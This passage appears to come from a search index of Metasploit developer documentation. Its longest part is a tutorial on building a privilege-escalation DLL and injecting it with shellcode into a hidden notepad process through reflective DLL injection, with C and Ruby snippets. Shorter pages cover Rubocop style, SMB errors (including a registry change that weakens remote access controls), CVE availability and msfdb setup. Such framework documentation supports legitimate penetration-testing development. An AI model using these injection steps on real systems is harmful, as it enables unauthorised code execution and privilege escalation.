clear way for me to run the code I wanted to get system, then call the function responsible for starting the shellcode. In my case, all I needed to do was to somehow run PrivEsc and then ExecutePayload(pPayload) . Sure enough, if you check out the ReflectiveDll.c file, you can see that it is really straightforward and should look a lot like your previous DllMain function, except there's a function call in DLL_PROCESS_ATTACH : #include \"ReflectiveLoader.h\" #include \"Exploit.h\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE *)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; //MessageBox(0, \"In DLLMain\", \"Status\", MB_OK); Exploit(lpReserved); break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; } One thing to understand- despite the feelings I had reading through the framework side, you must specify the entry point for the code you want executed in DLL_PROCESS_ATTACH . We are going to be (quasi) calling DllMain , and DLL_PROCESS_ATTACH will fire, thus giving us code execution in the remote process context. As you create the rest of your code, remember that lpReserved from DllMain will contain the address of your payload. Be sure that lpReserve has a clear path to your call of ExecutePayload() . Some of the output from the framework side of the injection was confusing to me because I am used to loading DLLs explicitly and implicitly, and some of the framework methods made it sound like we were not relying on DLL_PROCESS_ATTACH. We are, but in a slightly more round-about way. That said, remember if you go back to troubleshooting just your exploit code in the extern function, DLL_PROCESS_ATTACH will still execute if you use rundll32.exe to call your function. Be sure to comment out your calls in DLL_PROCESS_ATTACH if you go back to debugging unless you want dueling exploits. OK, so at this point, you\u2019ve got a DLL with a function that does something you want, and even better, it compiles! Move that binary to the data directory corresponding to the external directory you used above. i.e. if you used external/source/exploits/myfancyexploit , put your binary in data/exploits/myfancyexploit/ . If you can automate that move as a post build step, even better! Now that we have the binary, we need to execute it on target- Enter Framework! Step 4: Adding the framework module Once you\u2019ve got the DLL working and have it compiling with ReflectiveLoader, you have to make a framework module to use it. OJ\u2019s https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/capcom_sys_exec is a great place to start looking as an examples; it is super easy and simple to read, so let's review: (1) Make sure you have a handle to a process\u2026. The easiest way be able to get a handle to a process is to launch your own: notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true}) (2) We need to write to that process and launch a thread in the process, so let's get a handle to the process with ALL_ACCESS attributes: process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS) (3) Grab the path to your binary file: library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'myfancyexploit', 'myfancyexploit.dll') Replace the directory and file names with the ones to your binary. (3.5) OJ went ahead and expanded the path; likely this is because he\u2019s used filepath hijacking in the past: library_path = ::File.expand_path(library_path) (4) Now, here\u2019s where things get fun- inject your dll directly into the memory of notepad: exploit_mem, offset = inject_dll_into_process(process, library_path) That function allocates memory in the process and loads up the dll. There is a second method that allows you to upload dll data, so you could create a payload using a template and load that without the dll touching the local or remote disk, but I have not had cause to use it. Unfortunately, this is where my grasp of things gets tenuous because it departs from my experience of traditional DLL loading with LoadLibrary and GetProcAddress. We copied the DLL into the remote process memory, but we have not \u201cloaded\u201d it, so DLL_PROCESS_ATTACH is not executed. That\u2019s a good thing, as we have not yet provided the payload! I square this by basically treating it like process hollowing, but on a thread-level. Watching OJ\u2019s ReflectiveDll injection video might help: https://vimeo.com/108076345 You may want to watch it daily for a month or so. Regardless, now we have a process with our exploit dll mapped into its memory, but not doing anything. Now we need to get the payload into the process too, so we can get exploit and payload execution. Getting the payload in there is honestly not much different that getting the DLL data in there. (5) Just allocate some RWX memory and copy the shellcode over. There\u2019s a method for that: payload_mem = inject_into_process(process, payload.encoded) To be clear, That\u2019s the first time you should have dealt with the payload, because while it is annoying how much goes on in the background in Framework, when you know it is happening, Framework is awesome! Now, if you\u2019ve been paying attention to the return values from the above methods, we have three important values: (1) exploit_mem that has the address of the dll loaded into memory, (2) offset that (I think) contains the offset to the DllMain function inside the DLL loaded into memory, and (3) payload_mem , that contains the address of your payload. (6) Now, With those three values, and our code stored in the process's memory, things make a lot more sense. We just need to create a thread in the process and point it to the DllMain function with the address of our payload as the lpReserve parameter. process.thread.create(exploit_mem + offset, payload_mem) (6) What I\u2019m Still unclear about: (6.1) How do we get the offset value? If we check out inject_dll_into_process , it shows that it is searching the pe for ReflectiveLoader and that's not a string I can find as an entry point. I do not understand why that gives us the offset to what I believe to be DllMain when it appears to be searching to ReflectiveLoader...? (6.2) There are a few ways to use ReflectiveDllLoader , and I wish I could read more on using it as an import like OJ does in that capcom_sys_exec .","title":"Using ReflectiveDll Injection"},{"location":"dev/dark/Using-ReflectiveDll-Injection/#using-the-reflectivedll-loader-in-a-metasploit-module","text":"First, let\u2019s be clear. I have used this exactly once, but there exists little in the way of guidance on how ReflectiveDll injection works in Framework, so I figure poor guidance is better than none. I am in part hoping that someone who knows how it works will come along and correct this, ala Cunningham\u2019s Law. This documentation assumes that you have some familiarity with DLLs already.","title":"Using the ReflectiveDll loader in a metasploit module."},{"location":"dev/dark/Using-ReflectiveDll-Injection/#step-1-make-your-dll","text":"Use Visual studio 2013 and make a standard, empty dll. Do not attempt to add the reflective dll stuff yet. When you make the dll, make sure that you have at least three files: A header file with the function declarations, a c(pp) file with the functions that \u2018do\u2019 the exploit, and a dllMain file with the DllMain function. I find that testing the dll outside the reflective loader helps tremendously, so in the header file, I declare my working function as an extern , C-style function: extern \"C\" __declspec (dllexport) void PrivEsc(void); I think using C as the language over cpp would make life marginally easier, as you can combine the source code into one project. Using cpp meant I needed to have separate projects, or at least using my limited compiler knowledge that\u2019s how I got it to work. I noticed OJ was able to extend his c project ( https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/capcom_sys_exec ) to include the reflectiveloader, but I could not seem to do the same for my cpp project. Store your project in external/source/exploits/<identifier>/<projectname> . That\u2019s not written in stone. The project I just finished had both dll and exe, so I have external/source/exploits/<identifier>/dll and external/source/exploits/<identifier>/exe . Just don't be a jerk and do something hard to follow. Your requirements may differ, and we're not super particular as long as it makes sense. I suggest the identifier to make life easier, then a project name because you\u2019ll be bringing the reflective loader project into the identifier folder, and at least I like to have some separation between the two.","title":"Step 1- make your dll"},{"location":"dev/dark/Using-ReflectiveDll-Injection/#step-2-write-the-dll-using-an-extern-c-linkage-entry-point-to-make-testing-easier","text":"In this case, I was writing a privesc, so I called it PrivEsc because I am super-imaginative and I have done enough code maintenance that I try to be nice to the next dev. By declaring it an external function and using C-style linkages, you can test the function independently using the rundll32.exe binary. For example, if the dll were named mydll.dll, you can run the privEsc alone with the command > rundll.exe mydll.dll, PrivEsc That way, you can isolate the behavior of the exploit before adding a payload. Because I was using a privesc, I just made the last line of the privesc system(\u201ccmd.exe\u201d); so I could verify that on the target machine. If I got a system-level cmd prompt, I won!","title":"Step 2  Write the dll using an extern, C-linkage entry point to make testing easier"},{"location":"dev/dark/Using-ReflectiveDll-Injection/#step-3-add-reflectivedll-injection-to-it","text":"This is actually pretty simple. Once your code is doing what it is supposed to do, add the ReflectiveDll injection to it. Move the rdi (ReflectiveDll injection) code into your existing project and add the inject project into your solution. Again, this worked for me and appears to be a popular choice. When you copy the RefelctiveDll code into your project, you are going to replace your DllMain file with the ReflectiveDll.c file. Include the header file containing your desired entry point so that when DllMain gets launched, it can find your desired entry point. I also noticed and appreciated that others structured the code into two parts: Exploit and Exploiter. Exploiter does the heavy lifting with functions, and Exploit calls the functions and runs the shellcode after the exploit completes. For example, I made a privesc and the code required to accomplish the elevation was bundled in a function called PrivEsc contained within my Exploiter.cpp file. The Exploit file was very simple in comparison: #include <Windows.h> #include \"Exploit.h\" #include \"Exploiter.h\" static VOID ExecutePayload(LPVOID lpPayload) { VOID(*lpCode)() = (VOID(*)())lpPayload; lpCode(); return; } VOID Exploit(LPVOID lpPayload) { PrivEsc(); ExecutePayload(lpPayload); } That ExecutePayload function is there to... well.... Execute the payload. We'll talk about it later, but make sure that you have it accepting a pointer and executing it. That'll be how we get a payload into the running thread. All the Exploit.cpp needs to do is give a clear way for me to run the code I wanted to get system, then call the function responsible for starting the shellcode. In my case, all I needed to do was to somehow run PrivEsc and then ExecutePayload(pPayload) . Sure enough, if you check out the ReflectiveDll.c file, you can see that it is really straightforward and should look a lot like your previous DllMain function, except there's a function call in DLL_PROCESS_ATTACH : #include \"ReflectiveLoader.h\" #include \"Exploit.h\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE *)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; //MessageBox(0, \"In DLLMain\", \"Status\", MB_OK); Exploit(lpReserved); break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; } One thing to understand- despite the feelings I had reading through the framework side, you must specify the entry point for the code you want executed in DLL_PROCESS_ATTACH . We are going to be (quasi) calling DllMain , and DLL_PROCESS_ATTACH will fire, thus giving us code execution in the remote process context. As you create the rest of your code, remember that lpReserved from DllMain will contain the address of your payload. Be sure that lpReserve has a clear path to your call of ExecutePayload() . Some of the output from the framework side of the injection was confusing to me because I am used to loading DLLs explicitly and implicitly, and some of the framework methods made it sound like we were not relying on DLL_PROCESS_ATTACH. We are, but in a slightly more round-about way. That said, remember if you go back to troubleshooting just your exploit code in the extern function, DLL_PROCESS_ATTACH will still execute if you use rundll32.exe to call your function. Be sure to comment out your calls in DLL_PROCESS_ATTACH if you go back to debugging unless you want dueling exploits. OK, so at this point, you\u2019ve got a DLL with a function that does something you want, and even better, it compiles! Move that binary to the data directory corresponding to the external directory you used above. i.e. if you used external/source/exploits/myfancyexploit , put your binary in data/exploits/myfancyexploit/ . If you can automate that move as a post build step, even better!","title":"Step 3 Add ReflectiveDll Injection to it."},{"location":"dev/dark/Using-ReflectiveDll-Injection/#now-that-we-have-the-binary-we-need-to-execute-it-on-target-enter-framework","text":"","title":"Now that we have the binary, we need to execute it on target- Enter Framework!"},{"location":"dev/dark/Using-ReflectiveDll-Injection/#step-4-adding-the-framework-module","text":"Once you\u2019ve got the DLL working and have it compiling with ReflectiveLoader, you have to make a framework module to use it. OJ\u2019s https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/capcom_sys_exec is a great place to start looking as an examples; it is super easy and simple to read, so let's review: (1) Make sure you have a handle to a process\u2026. The easiest way be able to get a handle to a process is to launch your own: notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true}) (2) We need to write to that process and launch a thread in the process, so let's get a handle to the process with ALL_ACCESS attributes: process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS) (3) Grab the path to your binary file: library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'myfancyexploit', 'myfancyexploit.dll') Replace the directory and file names with the ones to your binary. (3.5) OJ went ahead and expanded the path; likely this is because he\u2019s used filepath hijacking in the past: library_path = ::File.expand_path(library_path) (4) Now, here\u2019s where things get fun- inject your dll directly into the memory of notepad: exploit_mem, offset = inject_dll_into_process(process, library_path) That function allocates memory in the process and loads up the dll. There is a second method that allows you to upload dll data, so you could create a payload using a template and load that without the dll touching the local or remote disk, but I have not had cause to use it. Unfortunately, this is where my grasp of things gets tenuous because it departs from my experience of traditional DLL loading with LoadLibrary and GetProcAddress. We copied the DLL into the remote process memory, but we have not \u201cloaded\u201d it, so DLL_PROCESS_ATTACH is not executed. That\u2019s a good thing, as we have not yet provided the payload! I square this by basically treating it like process hollowing, but on a thread-level. Watching OJ\u2019s ReflectiveDll injection video might help: https://vimeo.com/108076345 You may want to watch it daily for a month or so. Regardless, now we have a process with our exploit dll mapped into its memory, but not doing anything. Now we need to get the payload into the process too, so we can get exploit and payload execution. Getting the payload in there is honestly not much different that getting the DLL data in there. (5) Just allocate some RWX memory and copy the shellcode over. There\u2019s a method for that: payload_mem = inject_into_process(process, payload.encoded) To be clear, That\u2019s the first time you should have dealt with the payload, because while it is annoying how much goes on in the background in Framework, when you know it is happening, Framework is awesome! Now, if you\u2019ve been paying attention to the return values from the above methods, we have three important values: (1) exploit_mem that has the address of the dll loaded into memory, (2) offset that (I think) contains the offset to the DllMain function inside the DLL loaded into memory, and (3) payload_mem , that contains the address of your payload. (6) Now, With those three values, and our code stored in the process's memory, things make a lot more sense. We just need to create a thread in the process and point it to the DllMain function with the address of our payload as the lpReserve parameter. process.thread.create(exploit_mem + offset, payload_mem) (6) What I\u2019m Still unclear about: (6.1) How do we get the offset value? If we check out inject_dll_into_process , it shows that it is searching the pe for ReflectiveLoader and that's not a string I can find as an entry point. I do not understand why that gives us the offset to what I believe to be DllMain when it appears to be searching to ReflectiveLoader...? (6.2) There are a few ways to use ReflectiveDllLoader , and I wish I could read more on using it as an import like OJ does in that capcom_sys_exec .","title":"Step 4: Adding the framework module"},{"location":"dev/dark/Using-Rubocop/","text":"Rubocop Rubocop is a great tool for beginning and experienced Ruby coders if you treat the output for what it is: suggestions. While msftidy remains our barrier to entry, there are many things it will not catch. As msftidy is not strict enough to catch everything, Rubocop sometimes goes too far in its suggestions. Installing Rubocop Installing Rubocop is really easy. Simply go to your metasploit-framework directory and run: gem install rubocop Running Rubocop Run rubocop <ruby file> What suggestions should you ignore? We have an evolving set of suggestion tweaks from the default rubocop that is checked into the latest tree https://github.com/rapid7/metasploit-framework/blob/master/.rubocop.yml . A lot of the suggestions that often lead to worse code (especially when applied after a module is tested originally) have been disabled, along with ones that are more subjective or go against established Metasploit norms. This is prone to change over time. For now, we try to support the syntax that works with the latest supported versions of Ruby, which at this writing are Ruby 2.2 through 2.4. So what suggestions should you take to heart? Spacing White space affects code readability, and we'd like to try and maintain (or establish) a continual look and feel. If Rubocop complains about whitespace, please take it to heart. Parentheticals, braces, and brackets Rubocop likes aligned parentheses, spaces around brackets, and is picky about spacing around most encapsulating syntax elements. As a big fan of Python, I agree wholeheartedly with these alignment and spacing suggestions, as it makes me feel like I'm home. Others will disagree about importance, but no one will complain if you do it right, only varying volumes of complaining when doing it wrong. Code Complexity As stated above, Rubocops's code complexity warnings are less useful than we'd like. Please keep functions below 100 lines (50 is better). Otherwise, just be clear. If two lines will be readable, use two lines. Someone will be coming along behind you. Please do not make that person hate you. We do have most of the rubocop warnings disabled, but use your head. Conditional Statements Rubocop encourages single-line incomprehensible conditional statements that reek of blatant, painful, Ruby exhibitionism. Again, as a non-native Ruby coder that has to go back and figure out what old modules do, I humbly request that you please ignore those warnings. Make your conditional statements easy to read and understand, make them stand out as conditional, and please, never, ever use unless . I've watched unless screw up very good, talented, experienced coders. I've also watched senior members of our team snap and git grep through the codebase ripping out unless statements and muttering unpleasant things the entire time. If your conditional statement takes up two whole lines, so be it. If two nested conditional statements can be replaced with a single, unreadable and impossible to debug multi-line complex statement, please leave the two statements in place. Ternary Operations This is likely never to come up, but if it does, please don't use ternary operators. If you do use them, think about the case where there might be a backtrace - will you know which path was taken? Note that if you're just trying to assign based on conditional, ruby also supports this syntax which can be clearer if your branches are complex: a = if x = y foo else bar end But I copied it from another module! Consistency is a virtue only when it is correct. (In all seriousness, use your best judgement here, and don't be afraid to ask.). Also, we allow cleaning up other modules too, though be forewarned, please have a way to test any modules you clean up.","title":"Rubocop"},{"location":"dev/dark/Using-Rubocop/#rubocop","text":"Rubocop is a great tool for beginning and experienced Ruby coders if you treat the output for what it is: suggestions. While msftidy remains our barrier to entry, there are many things it will not catch. As msftidy is not strict enough to catch everything, Rubocop sometimes goes too far in its suggestions.","title":"Rubocop"},{"location":"dev/dark/Using-Rubocop/#installing-rubocop","text":"Installing Rubocop is really easy. Simply go to your metasploit-framework directory and run: gem install rubocop","title":"Installing Rubocop"},{"location":"dev/dark/Using-Rubocop/#running-rubocop","text":"Run rubocop <ruby file>","title":"Running Rubocop"},{"location":"dev/dark/Using-Rubocop/#what-suggestions-should-you-ignore","text":"We have an evolving set of suggestion tweaks from the default rubocop that is checked into the latest tree https://github.com/rapid7/metasploit-framework/blob/master/.rubocop.yml . A lot of the suggestions that often lead to worse code (especially when applied after a module is tested originally) have been disabled, along with ones that are more subjective or go against established Metasploit norms. This is prone to change over time. For now, we try to support the syntax that works with the latest supported versions of Ruby, which at this writing are Ruby 2.2 through 2.4.","title":"What suggestions should you ignore?"},{"location":"dev/dark/Using-Rubocop/#so-what-suggestions-should-you-take-to-heart","text":"","title":"So what suggestions should you take to heart?"},{"location":"dev/dark/Using-Rubocop/#spacing","text":"White space affects code readability, and we'd like to try and maintain (or establish) a continual look and feel. If Rubocop complains about whitespace, please take it to heart.","title":"Spacing"},{"location":"dev/dark/Using-Rubocop/#parentheticals-braces-and-brackets","text":"Rubocop likes aligned parentheses, spaces around brackets, and is picky about spacing around most encapsulating syntax elements. As a big fan of Python, I agree wholeheartedly with these alignment and spacing suggestions, as it makes me feel like I'm home. Others will disagree about importance, but no one will complain if you do it right, only varying volumes of complaining when doing it wrong.","title":"Parentheticals, braces, and brackets"},{"location":"dev/dark/Using-Rubocop/#code-complexity","text":"As stated above, Rubocops's code complexity warnings are less useful than we'd like. Please keep functions below 100 lines (50 is better). Otherwise, just be clear. If two lines will be readable, use two lines. Someone will be coming along behind you. Please do not make that person hate you. We do have most of the rubocop warnings disabled, but use your head.","title":"Code Complexity"},{"location":"dev/dark/Using-Rubocop/#conditional-statements","text":"Rubocop encourages single-line incomprehensible conditional statements that reek of blatant, painful, Ruby exhibitionism. Again, as a non-native Ruby coder that has to go back and figure out what old modules do, I humbly request that you please ignore those warnings. Make your conditional statements easy to read and understand, make them stand out as conditional, and please, never, ever use unless . I've watched unless screw up very good, talented, experienced coders. I've also watched senior members of our team snap and git grep through the codebase ripping out unless statements and muttering unpleasant things the entire time. If your conditional statement takes up two whole lines, so be it. If two nested conditional statements can be replaced with a single, unreadable and impossible to debug multi-line complex statement, please leave the two statements in place.","title":"Conditional Statements"},{"location":"dev/dark/Using-Rubocop/#ternary-operations","text":"This is likely never to come up, but if it does, please don't use ternary operators. If you do use them, think about the case where there might be a backtrace - will you know which path was taken? Note that if you're just trying to assign based on conditional, ruby also supports this syntax which can be clearer if your branches are complex: a = if x = y foo else bar end","title":"Ternary Operations"},{"location":"dev/dark/Using-Rubocop/#but-i-copied-it-from-another-module","text":"Consistency is a virtue only when it is correct. (In all seriousness, use your best judgement here, and don't be afraid to ask.). Also, we allow cleaning up other modules too, though be forewarned, please have a way to test any modules you clean up.","title":"But I copied it from another module!"},{"location":"dev/dark/What-my-Rex-Proto-SMB-Error-means/","text":"What does my Rex::Proto::SMB Error mean? All SMB error codes are explained in the following MSDN documentation: http://msdn.microsoft.com/en-us/library/ee441884.aspx The following is a list of commonly seen errors when using an Metasploit module that involves SMB: STATUS_ACCESS_DENIED If you are testing against newer Windows systems such as Windows 7, by default you will see STATUS_ACCESS_DENIED because these systems no longer allow remote access to the share. To change this, that target machine will need to manually change the LocalAccountTokenFilterPolicy setting to 1 in the registry: Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] \"LocalAccountTokenFilterPolicy\"=dword:00000001 STATUS_LOGON_FAILURE Invalid SMBUSER or SMBPASS datastore option. Or, in Local Security Settings, you should probably set Network access:Sharing and security model for local accounts to \" Local users authenticate as themselves \". STATUS_BAD_NETWORK_NAME Invalid SMB share datastore option. STATUS_LOGON_TYPE_NOT_GRANTED On Windows, in Local Security Settings, Network access:Sharing and security model for local accounts to \"Local users authenticate as themselves\".","title":"What does my Rex::Proto::SMB Error mean?"},{"location":"dev/dark/What-my-Rex-Proto-SMB-Error-means/#what-does-my-rexprotosmb-error-mean","text":"All SMB error codes are explained in the following MSDN documentation: http://msdn.microsoft.com/en-us/library/ee441884.aspx The following is a list of commonly seen errors when using an Metasploit module that involves SMB: STATUS_ACCESS_DENIED If you are testing against newer Windows systems such as Windows 7, by default you will see STATUS_ACCESS_DENIED because these systems no longer allow remote access to the share. To change this, that target machine will need to manually change the LocalAccountTokenFilterPolicy setting to 1 in the registry: Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] \"LocalAccountTokenFilterPolicy\"=dword:00000001 STATUS_LOGON_FAILURE Invalid SMBUSER or SMBPASS datastore option. Or, in Local Security Settings, you should probably set Network access:Sharing and security model for local accounts to \" Local users authenticate as themselves \". STATUS_BAD_NETWORK_NAME Invalid SMB share datastore option. STATUS_LOGON_TYPE_NOT_GRANTED On Windows, in Local Security Settings, Network access:Sharing and security model for local accounts to \"Local users authenticate as themselves\".","title":"What does my Rex::Proto::SMB Error mean?"},{"location":"dev/dark/Why-CVE-is-not-available/","text":"Why is a CVE Not Available? This documentation explains why sometimes you might see this message in either msfconsole or module documentation: CVE: Not available This message indicates that, as far as the Metasploit team knows, there is no CVE assigned to that particular module at the moment. There are multiple reasons why this might happen: The vendor does not wish to assign a CVE. There is a delay in the process of assigning a CVE. The module is not meant to target a specific CVE. Likely something generic. We are unable to find a matching CVE because there isn't enough technical information to verify. The Metasploit team will continue to monitor existing modules without any CVEs, and update them as needed. If you believe the module's CVE information is inaccurate or out-of-date, please feel free to submit a pull request to us. Thank you! :-)","title":"Why is a CVE Not Available?"},{"location":"dev/dark/Why-CVE-is-not-available/#why-is-a-cve-not-available","text":"This documentation explains why sometimes you might see this message in either msfconsole or module documentation: CVE: Not available This message indicates that, as far as the Metasploit team knows, there is no CVE assigned to that particular module at the moment. There are multiple reasons why this might happen: The vendor does not wish to assign a CVE. There is a delay in the process of assigning a CVE. The module is not meant to target a specific CVE. Likely something generic. We are unable to find a matching CVE because there isn't enough technical information to verify. The Metasploit team will continue to monitor existing modules without any CVEs, and update them as needed. If you believe the module's CVE information is inaccurate or out-of-date, please feel free to submit a pull request to us. Thank you! :-)","title":"Why is a CVE Not Available?"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/","text":"Work needed to allow msfdb to use postgresql-common Linux distributions, such as Debian and Kali Linux, use postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) wrappers to interact with one or more PostgreSQL installations. Therefore, commands such as initdb and pg_ctl are not in the user's PATH . msfdb currently assumes these programs are available in the PATH . In order to support platforms that use the postgresql-common wrappers, msfdb would need to determine if it is running on such a platform and modify the commands used to perform the various setup and configuration operations. See the section \"msfdb support for postgresql-common\" for additional details. msfdb support for postgresql-common Requirements Determine if the system is using postgresql-common . Ideally, allow a user without elevated privileges to setup a database for use with Metasploit. Determine the current version of PostgreSQL on the system when multiple versions might be installed in parallel. The port number used for the server when pg_createcluster is run without a port number option defaults to the \"next free port starting from 5432\". If we don't specify the port number when calling pg_createcluster we can scrape the port number from the pg_lsclusters output. PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters --no-header | awk '/^9.6/ { if ($2 == \"msf\") { print $3; } }' 5433 Notes Debian's postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) contains PostgreSQL wrapper tools: pg_lsclusters : list all available clusters with their status and configuration pg_createcluster : wrapper for initdb , sets up the necessary configuration structure pg_createcluster [options] version name [-- initdb options] pg_ctlcluster : wrapper for pg_ctl , control the cluster postgres server pg_ctlcluster [options] cluster-version cluster-name action -- [pg_ctl options] where action = start|stop|restart|reload|promote pg_dropcluster : remove a cluster and its configuration pg_dropcluster [--stop] cluster-version cluster-name pg_wrapper : wrapper for PostgreSQL client commands client-program [--cluster version/cluster] [...] ( client-program: psql, createdb, dropuser, and all other client programs installed in /usr/lib/postgresql/ version/bin). The \"database cluster\" simply refers to a set of databases on a single server rather than a group of multiple database servers. Manually create and initialize MSF database using postgresql-common Issues Encountered permissions issues when attempting to create a cluster. pg_createcluster --user=$(whoami) --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change permissions of \u2018/etc/postgresql/9.6/msf\u2019: No such file or directory Error: could not create configuration directory; you might need to run this program with root privileges Requiring root privileges may be prohibitive to user installs of MSF. How can we create a cluster without root privileges? Adding the user to the postgres group and attempting to sudo -u postgres the command, however, resulted in the same error message. Looking closer at the various commands and discovered the following in the man page for pg_wrapper . PG_CLUSTER_CONF_ROOT This specifies an alternative base directory for cluster configurations. This is usually /etc/postgresql/, but for testing/development purposes you can change this to point to e. g. your home directory, so that you can use the postgresql-common tools without root privileges. Working Solution Create cluster (\"initdb\") to set up the necessary configuration structure: Note, running mkdir -p $HOME/.local/etc/postgresql; before the pg_createcluster command didn't stop the \"install: cannot change owner and permissions of \u2018/home/msfdev/.local/etc/postgresql/9.6\u2019: Operation not permitted\" message from appearing. This appears to be a warning only and doesn't seem to affect cluster creation. mkdir -p $HOME/.local/var/log/postgresql; PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_createcluster --user=$(whoami) --datadir=$HOME/msf-db-datadir --socketdir=$HOME/.local/var/run/postgresql --logfile=$HOME/.local/var/log/postgresql/postgresql-version-msf.log --encoding=UTF8 9.6 msf -- --username=$(whoami) --auth-host=trust --auth-local=trust install: cannot change owner and permissions of \u2018/home/msfdev/.local/etc/postgresql/9.6\u2019: Operation not permitted Creating new cluster 9.6/msf ... config /home/msfdev/.local/etc/postgresql/9.6/msf data /home/msfdev/msf-db-datadir locale en_US.UTF-8 socket /home/msfdev/.local/var/run/postgresql port 5433 Check cluster was successfully created and appears in the list of all available clusters: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 down msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Start postmaster server for the cluster (\"pg_ctl\"): PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start Check that the cluster was successfully started: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Perform msfdb 's write_db_config method work by manually creating the ~/.msf4/database.yml file. development: &pgsql adapter: postgresql database: msf username: msf password: Password123 host: 127.0.0.1 port: 5433 pool: 200 production: &production <<: *pgsql test: <<: *pgsql database: msftest username: msftest password: Password123 Create database users: Note, these steps are from msfdb 's init_db method. The following example only creates the main MSF user account and not the test account. PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"create user msf with password 'Password123';\" postgres CREATE ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf createdb;\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql psql --cluster 9.6/msf -c \"alter role msf with password 'Password123';\" postgres ALTER ROLE PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql createdb --cluster 9.6/msf -O msf -h 127.0.0.1 -U msf -E UTF-8 -T template0 msf Perform msfdb 's write_db_client_auth_config method work, except it needs to write the pg_hba.conf file now stored in under PG_CLUSTER_CONF_ROOT and inside the version/cluster-name directory. In this example that location is: $HOME/.local/etc/postgresql/9.6/msf/pg_hba.conf . Perform msfdb 's restart_db method work, by stopping and then starting the server. Stop and then start postmaster server for the cluster (\"pg_ctl\"): PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf stop PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_ctlcluster 9.6 msf start Check that the cluster was successfully started: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters Ver Cluster Port Status Owner Data directory Log file 9.6 msf 5433 online msfdev /home/msfdev/msf-db-datadir /home/msfdev/.local/var/log/postgresql/postgresql-version-msf.log Create initial database schema: Note, these steps are from msfdb 's init_db method. cd ~/metasploit-framework bundle exec rake db:migrate Start msfconsole and verify postgresql connection using the db_status command: # disable or remove ~/.msf4/config if it is configured to auto connect to a data service mv ~/.msf4/config ~/.msf4/config.disable ./msfconsole ... msf5 > db_status [*] Connected to msf. Connection type: postgresql. Drop (delete) the cluster: PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_dropcluster 9.6 msf","title":"Work needed to allow msfdb to use postgresql-common"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#work-needed-to-allow-msfdb-to-use-postgresql-common","text":"Linux distributions, such as Debian and Kali Linux, use postgresql-common (Multi-Version/Multi-Cluster PostgreSQL architecture) wrappers to interact with one or more PostgreSQL installations. Therefore, commands such as initdb and pg_ctl are not in the user's PATH . msfdb currently assumes these programs are available in the PATH . In order to support platforms that use the postgresql-common wrappers, msfdb would need to determine if it is running on such a platform and modify the commands used to perform the various setup and configuration operations. See the section \"msfdb support for postgresql-common\" for additional details.","title":"Work needed to allow msfdb to use postgresql-common"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#msfdb-support-for-postgresql-common","text":"","title":"msfdb support for postgresql-common"},{"location":"dev/dark/Work-needed-to-allow-msfdb-to-use-postgresql-common/#requirements","text":"Determine if the system is using postgresql-common . Ideally, allow a user without elevated privileges to setup a database for use with Metasploit. Determine the current version of PostgreSQL on the system when multiple versions might be installed in parallel. The port number used for the server when pg_createcluster is run without a port number option defaults to the \"next free port starting from 5432\". If we don't specify the port number when calling pg_createcluster we can scrape the port number from the pg_lsclusters output. PG_CLUSTER_CONF_ROOT=$HOME/.local/etc/postgresql pg_lsclusters --no-header | awk '/^9.6/ { if ($2 == \"msf\") { print $3; } }' 